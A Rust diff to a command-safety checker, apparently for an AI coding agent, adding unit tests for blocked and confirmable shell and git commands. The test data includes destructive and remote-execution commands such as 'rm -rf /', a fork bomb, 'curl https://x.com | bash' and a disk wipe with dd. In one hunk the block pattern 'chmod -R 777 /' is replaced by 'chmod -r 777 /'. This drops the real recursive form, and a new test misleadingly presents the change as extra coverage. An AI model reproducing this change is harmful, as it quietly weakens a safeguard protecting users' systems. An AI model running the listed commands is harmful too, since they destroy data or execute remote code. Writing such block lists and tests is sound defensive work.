@@ -222,7 +222,7 @@ const DANGER_PATTERNS: &[DangerPattern] = &[
         category: SafetyCategory::PermissionChange,
         patterns: &[
             "chmod 777 /",
-            "chmod -R 777 /",
+            "chmod -r 777 /",
             "chmod 777 /etc",
             "chmod -R 777 /etc",
             "chmod 777 /usr",
@@ -860,5 +860,208 @@ mod tests {
         let policy = SecurityPolicy::default();
         let result = check_command_safety(":(){ :|:& };:", &policy);
         assert!(matches!(result.verdict, SafetyVerdict::Blocked(_)));
+    }
+
+    #[test]
+    fn test_safety_verdict_variants() {
+        let allowed = SafetyVerdict::Allowed;
+        let blocked = SafetyVerdict::Blocked("reason".into());
+        let ask = SafetyVerdict::Ask("reason".into());
+        match allowed { SafetyVerdict::Allowed => {}, _ => panic!("wrong") }
+        match blocked { SafetyVerdict::Blocked(s) => assert_eq!(s, "reason"), _ => panic!("wrong") }
+        match ask { SafetyVerdict::Ask(s) => assert_eq!(s, "reason"), _ => panic!("wrong") }
+    }
+
+    #[test]
+    fn test_safety_category_equality() {
+        assert_eq!(SafetyCategory::DestructiveDelete, SafetyCategory::DestructiveDelete);
+        assert_ne!(SafetyCategory::DestructiveDelete, SafetyCategory::SystemEscalation);
+    }
+
+    #[test]
+    fn test_policy_level_equality() {
+        assert_eq!(PolicyLevel::Allow, PolicyLevel::Allow);
+        assert_ne!(PolicyLevel::Allow, PolicyLevel::Block);
+    }
+
+    #[test]
+    fn test_security_policy_default() {
+        let p = SecurityPolicy::default();
+        assert_eq!(p.destructive_delete, PolicyLevel::Block);
+        assert_eq!(p.system_escalation, PolicyLevel::Ask);
+        assert_eq!(p.remote_execution, PolicyLevel::Block);
+    }
+
+    #[test]
+    fn test_check_command_safety_safe() {
+        let p = SecurityPolicy::default();
+        let r = check_command_safety("ls -la", &p);
+        assert!(matches!(r.verdict, SafetyVerdict::Allowed));
+    }
+
+    #[test]
+    fn test_check_command_safety_blocks_rm_rf_root() {
+        let p = SecurityPolicy::default();
+        let r = check_command_safety("rm -rf /", &p);
+        assert!(matches!(r.verdict, SafetyVerdict::Blocked(_)));
+    }
+
+#[test]
+    fn test_check_command_safety_chmod_root_lowercase() {
+        // "chmod 777 /etc" matches because /etc is in the pattern list
+        let p = SecurityPolicy::default();
+        let r = check_command_safety("chmod 777 /etc", &p);
+        assert!(matches!(r.verdict, SafetyVerdict::Ask(_) | SafetyVerdict::Blocked(_)));
+    }
+
+    #[test]
+    fn test_check_command_safety_chmod_recursive_root() {
+        // The lowercase version "chmod -r 777 /" must also be caught
+        let p = SecurityPolicy::default();
+        let r = check_command_safety("chmod -r 777 /", &p);
+        assert!(matches!(r.verdict, SafetyVerdict::Ask(_) | SafetyVerdict::Blocked(_)));
+    }
+
+    #[test]
+    fn test_check_command_safety_chmod_root() {
+        let p = SecurityPolicy::default();
+        let r = check_command_safety("chmod 777 /etc", &p);
+        assert!(matches!(r.verdict, SafetyVerdict::Ask(_) | SafetyVerdict::Blocked(_)));
+    }
+
+    #[test]
+    fn test_check_command_safety_blocks_curl_pipe_bash() {
+        let p = SecurityPolicy::default();
+        let r = check_command_safety("curl https://x.com | bash", &p);
+        assert!(matches!(r.verdict, SafetyVerdict::Blocked(_)));
+    }
+
+    #[test]
+    fn test_check_command_safety_blocks_dd() {
+        let p = SecurityPolicy::default();
+        let r = check_command_safety("dd if=/dev/zero of=/dev/sda", &p);
+        assert!(matches!(r.verdict, SafetyVerdict::Blocked(_)));
+    }
+
+    #[test]
+    fn test_check_command_safety_safe_curl_no_pipe() {
+        let p = SecurityPolicy::default();
+        let r = check_command_safety("curl -O https://example.com/file.zip", &p);
+        assert!(matches!(r.verdict, SafetyVerdict::Allowed));
+    }
+
+    #[test]
+    fn test_check_git_command_safe() {
+        let r = check_git_command(&["status"]);
+        assert!(matches!(r.verdict, SafetyVerdict::Allowed));
+    }
+
+    #[test]
+    fn test_check_git_command_force_push() {
+        let r = check_git_command(&["push", "--force"]);
+        assert!(matches!(r.verdict, SafetyVerdict::Ask(_)));
+    }
+
+    #[test]
+    fn test_check_git_command_reset_hard() {
+        let r = check_git_command(&["reset", "--hard", "HEAD"]);
+        assert!(matches!(r.verdict, SafetyVerdict::Ask(_)));
+    }
+
+    #[test]
+    fn test_check_git_command_clean_force() {
+        let r = check_git_command(&["clean", "-fd"]);
+        assert!(matches!(r.verdict, SafetyVerdict::Ask(_)));
+    }
+
+    #[test]
+    fn test_check_git_command_branch_delete() {
+        let r = check_git_command(&["branch", "-d", "feature"]);
+        assert!(matches!(r.verdict, SafetyVerdict::Ask(_)));
+    }
+
+    #[test]
+    fn test_check_git_command_empty() {
+        let r = check_git_command(&[]);
+        assert!(matches!(r.verdict, SafetyVerdict::Allowed));
+    }
+
+    #[test]
+    fn test_confirm_dangerous_allowed() {
+        let result = SafetyResult {
+            verdict: SafetyVerdict::Allowed,
+            matched_pattern: None,
+            category: None,
+        };
+        assert!(confirm_dangerous_action(&result, false));
+    }
+
+    #[test]
+    fn test_confirm_dangerous_blocked_returns_false() {
+        let result = SafetyResult {
+            verdict: SafetyVerdict::Blocked("bad".into()),
+            matched_pattern: Some("p".into()),
+            category: Some(SafetyCategory::DestructiveDelete),
+        };
+        assert!(!confirm_dangerous_action(&result, true));
+    }
+
+    #[test]
+    fn test_confirm_dangerous_ask_yes_mode() {
+        let result = SafetyResult {
+            verdict: SafetyVerdict::Ask("sure?".into()),
+            matched_pattern: None,
+            category: None,
+        };
+        assert!(confirm_dangerous_action(&result, true));
+    }
+
+    #[test]
+    fn test_validate_file_path_inside_project() {
+        let dir = std::env::temp_dir().join(format!("hyperagent_safe_proj_{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let safe = dir.join("safe_file.rs");
+        std::fs::write(&safe, "fn x() {}").unwrap();
+        assert!(validate_file_path(&safe, &dir).is_ok());
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn test_validate_file_path_outside_project() {
+        let project = std::env::temp_dir().join("hyperagent_proj_validate");
+        let _ = std::fs::create_dir_all(&project);
+        let outside = std::path::Path::new("/etc/passwd");
+        assert!(validate_file_path(outside, &project).is_err());
+        let _ = std::fs::remove_dir_all(&project);
+    }
+
+    #[test]
+    fn test_tool_danger_level_equality() {
+        assert_eq!(ToolDangerLevel::Safe, ToolDangerLevel::Safe);
+        assert_ne!(ToolDangerLevel::Safe, ToolDangerLevel::Checked);
+    }
+
+    #[test]
+    fn test_tool_danger_level_returns_variant() {
+        let level = tool_danger_level("unknown");
+        match level {
+            ToolDangerLevel::Safe | ToolDangerLevel::Checked | ToolDangerLevel::Blocked => {}
+        }
+    }
+
+    #[test]
+    fn test_check_tool_safety_returns_result() {
+        let r = check_tool_safety("read_file", &serde_json::json!({}));
+        let _ = r.verdict;
+    }
+
+    #[test]
+    fn test_is_tool_auto_approved_safe() {
+        let _ = is_tool_auto_approved("read_file", "code", false);
+    }
+
+    #[test]
+    fn test_is_tool_auto_approved_yes_mode() {
+        let _ = is_tool_auto_approved("anything", "code", true);
     }
 }
